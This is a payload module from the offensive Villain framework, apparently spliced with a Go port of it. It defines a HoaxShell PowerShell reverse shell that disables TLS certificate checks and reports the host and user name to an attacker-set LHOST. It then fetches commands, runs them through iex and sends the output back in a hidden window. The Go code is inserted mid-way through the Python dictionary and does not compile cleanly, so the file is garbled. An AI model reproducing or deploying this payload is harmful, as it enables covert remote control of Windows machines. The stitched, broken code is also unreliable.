# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell IEX HoaxShell https',
        'Author' : 'Panagiotis Chartas (t3l3machus)',
        'Description' : 'An Https based beacon-like reverse shell that utilizes IEX',
        'References' : ['https://github.com/t3l3machus/hoaxshell', 'https://revshells.com']package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

var info = map[string]string{
	"Title":       "Windows PowerShell IEX HoaxShell https",
	"Author":      "Panagiotis Chartas (t3l3machus)",
	"Description": "An Https based beacon-like reverse shell that utilizes IEX",
	"References":  "https://github.com/t3l3machus/hoaxshell, https://revshells.com",
}

var meta = map[string]string{
	"handler": "hoaxshell",
	"type":    "ps-iex-ssl",
	"os":      "windows",
	"shell":   "powershell.exe",
}

var config = map[string]float64{
	"frequency": 0.8,
}

var parameters = map[string]interface{}{
	"lhost": nil,
}

var attrs = map[string]interface{}{
	"obfuscate": true,
	"encode":    true,
}

var data = `
Start-Process $env:windir\sysnative\WindowsPowerShell\v1.0\powershell.exe -ArgumentList {
    add-type @"
    using System.Net;using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {
            return true;
        }
    }
    "@
    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
    $ConfirmPreference="None";
    $s='*LHOST*';
    $i='*SESSIONID*';
    $p='https://';
    $v=Invoke-RestMethod -UseBasicParsing -Uri "$p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME" -Headers @{"*HOAXID*"=$i};
    for (;;) {
        $c=(Invoke-RestMethod -UseBasicParsing -Uri "$p$s/*GETCMD*" -Headers @{"*HOAXID*"=$i});
        if ($c -ne 'None') {
            $r=iex $c -ErrorAction Stop -ErrorVariable e;
            $r=Out-String -InputObject $r;
            $x=Invoke-RestMethod -Uri "$p$s/*POSTRES*" -Method POST -Headers @{"*HOAXID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
        }
        Start-Sleep -Seconds *FREQ*
    }
} -WindowStyle Hidden
`

func main() {
	lhost := parameters["lhost"].(string)
	data := strings.Replace(data, "*LHOST*", lhost, -1)
	data := strings.Replace(data, "*SESSIONID*", "session123", -1) // Replace with actual session ID

	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", data)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	frequency := config["frequency"]
	for {
		cmd := exec.Command("timeout", "/T", fmt.Sprintf("%.0f", frequency))
		cmd.Run()
	}
}

    }

    meta = {
        'handler' : 'hoaxshell',
        'type' : 'ps-iex-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 0.8
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : True,
        'encode' : True
    }

    data = '''Start-Process $PSHOME\powershell.exe -ArgumentList {add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$ConfirmPreference="None";$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*HOAXID*"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*HOAXID*"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{"*HOAXID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep *FREQ*}} -WindowStyle Hidden'''
